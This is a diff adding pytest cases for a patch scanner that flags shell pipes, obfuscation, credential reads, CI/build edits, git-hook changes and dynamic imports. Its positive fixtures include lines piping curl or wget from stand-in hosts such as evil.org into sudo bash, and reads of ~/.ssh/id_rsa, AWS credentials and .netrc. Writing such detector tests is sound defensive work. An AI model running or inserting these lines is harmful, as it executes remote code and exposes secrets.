@@ -21,6 +21,7 @@ from diffsmith.safety import (
     check_credential_reads,
     check_workflow_build,
     check_hook_tampering,
+    check_dynamic_access,
     scan_patch,
 )
 
@@ -432,4 +433,151 @@ def test_scratch_scripts_severity_capped_at_low(patch):
     for f in findings:
         if f["rule_id"] in ("SEC001_NETWORK_CALL", "SEC003_COMMAND_EXEC", "SEC005_CREDENTIAL_READS"):
             assert f["severity"] == "low"
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Scanner improvements tests:
+# SEC002: sudo bash, $(curl ...), download-then-run
+# SEC004: bytes.fromhex, marshal.loads, codecs.decode rot13/hex
+# SEC005: ~/.ssh/*, id_rsa, ~/.aws/credentials, Path.home(), ~/.netrc, keyring.get_password
+# SEC006: .gitlab-ci.yml, Jenkinsfile, tox.ini, noxfile.py, Dockerfile
+# SEC007: .husky/*, .githooks/*, lefthook.yml
+# SEC008: __import__, importlib.import_module, getattr(os/subprocess), chr join
+# ──────────────────────────────────────────────────────────────────────────────
+@pytest.mark.parametrize("patch", [
+    "--- a/deploy.sh\n+++ b/deploy.sh\n@@ -1,1 +1,2 @@\n+curl -s https://evil.org/x.sh | sudo bash\n",
+    "--- a/install.sh\n+++ b/install.sh\n@@ -1,1 +1,2 @@\n+bash -c \"$(curl -fsSL https://evil.org/install)\"\n",
+    "--- a/run.sh\n+++ b/run.sh\n@@ -1,1 +1,2 @@\n+curl -o /tmp/x https://evil.org/bin && bash /tmp/x\n",
+    "--- a/agent.py\n+++ b/agent.py\n@@ -1,1 +1,2 @@\n+os.system('sh -c \"$(wget -qO- evil.com)\"')\n",
+])
+def test_sec002_expanded_patterns_positive(patch):
+    findings = check_shell_pipe(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC002_SHELL_PIPE" for f in findings)
+    assert all(f["severity"] == "CRITICAL" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/deploy.sh\n+++ b/deploy.sh\n@@ -1,1 +1,2 @@\n+echo 'done' && sudo systemctl restart nginx\n",
+    "--- a/test.sh\n+++ b/test.sh\n@@ -1,1 +1,2 @@\n+cat file.txt | sudo tee /etc/out\n",
+    "--- a/run.py\n+++ b/run.py\n@@ -1,1 +1,2 @@\n+result = run_command('echo hello')\n",
+])
+def test_sec002_expanded_patterns_negative(patch):
+    findings = check_shell_pipe(patch)
+    assert len(findings) == 0
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/codec.py\n+++ b/src/codec.py\n@@ -1,1 +1,2 @@\n+data = bytes.fromhex('41424344')\n",
+    "--- a/src/loader.py\n+++ b/src/loader.py\n@@ -1,1 +1,2 @@\n+code_obj = marshal.loads(raw_bytecode)\n",
+    "--- a/src/rot.py\n+++ b/src/rot.py\n@@ -1,1 +1,2 @@\n+decoded = codecs.decode(obf_string, 'rot13')\n",
+    "--- a/src/hex.py\n+++ b/src/hex.py\n@@ -1,1 +1,2 @@\n+decoded = codecs.decode(hex_data, 'hex')\n",
+])
+def test_sec004_expanded_patterns_positive(patch):
+    findings = check_obfuscation(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC004_OBFUSCATION" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/calc.py\n+++ b/src/calc.py\n@@ -1,1 +1,2 @@\n+s = hex(255)\n",
+    "--- a/src/io.py\n+++ b/src/io.py\n@@ -1,1 +1,2 @@\n+line = f.readline().strip()\n",
+    "--- a/src/util.py\n+++ b/src/util.py\n@@ -1,1 +1,2 @@\n+raw = bytes([1, 2, 3])\n",
+])
+def test_sec004_expanded_patterns_negative(patch):
+    findings = check_obfuscation(patch)
+    assert len(findings) == 0
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/auth.py\n+++ b/src/auth.py\n@@ -1,1 +1,2 @@\n+with open('~/.ssh/id_rsa') as f: key = f.read()\n",
+    "--- a/src/cloud.py\n+++ b/src/cloud.py\n@@ -1,1 +1,2 @@\n+aws_path = Path.home() / '.aws' / 'credentials'\n",
+    "--- a/src/vault.py\n+++ b/src/vault.py\n@@ -1,1 +1,2 @@\n+pwd = keyring.get_password('service', 'user')\n",
+    "--- a/src/netrc.py\n+++ b/src/netrc.py\n@@ -1,1 +1,2 @@\n+creds = open('/home/user/.netrc').read()\n",
+])
+def test_sec005_expanded_patterns_positive(patch):
+    findings = check_credential_reads(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC005_CREDENTIAL_READS" for f in findings)
+    assert all(f["severity"] == "HIGH" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/user.py\n+++ b/src/user.py\n@@ -1,1 +1,2 @@\n+path = Path.home() / 'documents' / 'file.txt'\n",
+    "--- a/src/auth.py\n+++ b/src/auth.py\n@@ -1,1 +1,2 @@\n+user_session = Session(username='admin')\n",
+    "--- a/src/log.py\n+++ b/src/log.py\n@@ -1,1 +1,2 @@\n+logger.info('Access granted')\n",
+])
+def test_sec005_expanded_patterns_negative(patch):
+    findings = check_credential_reads(patch)
+    assert len(findings) == 0
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/.gitlab-ci.yml\n+++ b/.gitlab-ci.yml\n@@ -1,1 +1,2 @@\n+image: python:3.11\n",
+    "--- a/Jenkinsfile\n+++ b/Jenkinsfile\n@@ -1,1 +1,2 @@\n+pipeline { agent any }\n",
+    "--- a/tox.ini\n+++ b/tox.ini\n@@ -1,1 +1,2 @@\n+[tox]\nenvlist = py311\n",
+    "--- a/noxfile.py\n+++ b/noxfile.py\n@@ -1,1 +1,2 @@\n+import nox\n",
+    "--- a/Dockerfile\n+++ b/Dockerfile\n@@ -1,1 +1,2 @@\n+FROM python:3.11-slim\n",
+])
+def test_sec006_expanded_patterns_positive(patch):
+    findings = check_workflow_build(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC006_WORKFLOW_BUILD" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/model.py\n+++ b/src/model.py\n@@ -1,1 +1,2 @@\n+class Transformer: pass\n",
+    "--- a/docs/README.md\n+++ b/docs/README.md\n@@ -1,1 +1,2 @@\n+# Documentation\n",
+    "--- a/scripts/run.py\n+++ b/scripts/run.py\n@@ -1,1 +1,2 @@\n+print('hello')\n",
+])
+def test_sec006_expanded_patterns_negative(patch):
+    findings = check_workflow_build(patch)
+    assert len(findings) == 0
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/.husky/pre-commit\n+++ b/.husky/pre-commit\n@@ -1,1 +1,2 @@\n+npm test\n",
+    "--- a/.githooks/pre-push\n+++ b/.githooks/pre-push\n@@ -1,1 +1,2 @@\n+pytest\n",
+    "--- a/lefthook.yml\n+++ b/lefthook.yml\n@@ -1,1 +1,2 @@\n+pre-commit:\n  commands: lint\n",
+])
+def test_sec007_expanded_patterns_positive(patch):
+    findings = check_hook_tampering(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC007_HOOK_TAMPERING" for f in findings)
+    assert all(f["severity"] == "HIGH" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/hook.py\n+++ b/src/hook.py\n@@ -1,1 +1,2 @@\n+def register_event_hook(fn): pass\n",
+    "--- a/tests/test_hooks.py\n+++ b/tests/test_hooks.py\n@@ -1,1 +1,2 @@\n+def test_hook_callback(): pass\n",
+    "--- a/config/hooks.json\n+++ b/config/hooks.json\n@@ -1,1 +1,2 @@\n+{\"active\": true}\n",
+])
+def test_sec007_expanded_patterns_negative(patch):
+    findings = check_hook_tampering(patch)
+    assert len(findings) == 0
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/plugin.py\n+++ b/src/plugin.py\n@@ -1,1 +1,2 @@\n+mod = __import__('custom_plugin')\n",
+    "--- a/src/loader.py\n+++ b/src/loader.py\n@@ -1,1 +1,2 @@\n+mod = importlib.import_module('app.drivers')\n",
+    "--- a/src/exec.py\n+++ b/src/exec.py\n@@ -1,1 +1,2 @@\n+fn = getattr(os, 'system')\n",
+    "--- a/src/run.py\n+++ b/src/run.py\n@@ -1,1 +1,2 @@\n+p = getattr(subprocess, 'Popen')\n",
+    "--- a/src/obf.py\n+++ b/src/obf.py\n@@ -1,1 +1,2 @@\n+name = ''.join([chr(101), chr(120), chr(101), chr(99)])\n",
+])
+def test_sec008_dynamic_access_positive(patch):
+    findings = check_dynamic_access(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC008_DYNAMIC_ACCESS" for f in findings)
+    assert all(f["severity"] == "MEDIUM" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/math.py\n+++ b/src/math.py\n@@ -1,1 +1,2 @@\n+code = ord('a')\n",
+    "--- a/src/str_util.py\n+++ b/src/str_util.py\n@@ -1,1 +1,2 @@\n+s = ', '.join(['apple', 'banana'])\n",
+    "--- a/src/attr.py\n+++ b/src/attr.py\n@@ -1,1 +1,2 @@\n+val = getattr(my_object, 'attribute_name', None)\n",
+])
+def test_sec008_dynamic_access_negative(patch):
+    findings = check_dynamic_access(patch)
+    assert len(findings) == 0
+
 
